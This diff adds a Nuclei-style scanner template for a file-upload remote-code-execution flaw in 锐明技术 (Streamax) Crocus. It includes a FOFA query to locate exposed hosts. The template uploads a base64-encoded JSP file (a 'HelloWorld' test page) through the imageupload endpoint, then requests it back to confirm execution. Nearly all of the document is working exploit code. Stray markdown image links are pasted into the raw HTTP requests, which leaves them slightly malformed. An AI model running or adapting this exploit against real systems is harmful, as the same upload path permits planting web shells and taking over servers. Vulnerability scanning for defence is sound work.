@@ -1,0 +1,30 @@
+id: poc-iib214ic8lldzflo
+info:
+  name: 锐明技术Crocus-imageupload-文件上传导致RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iib214ic8lldzflo'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iib214ic8lldzflo
+    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+http:
+- raw:
+  - "POST /RepairRecord.do?Action=imageupload HTTP/1.1\nHost: {{Hostname}}\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\n\n{\n  \"username\": \"1\",\n  \"license\": \"1\",\n  \"chnnel\": 1,\n  \"type\": 1,\n  \"imsage\": \"PCUgb3V0LnByaW50bG4oIkhlbGxvV29ybGQiKTslPg==\",\n  \"picturename\": \"hello.jsp\"\n}\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711757837-fb29bd40-e87f-4f7e-b808-7d6152c7460b.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /SystemFile/PictureRecord/imageupload/hello.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711758068-6bb64aa1-7ef5-4ea3-8945-07c7ca00db2b.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
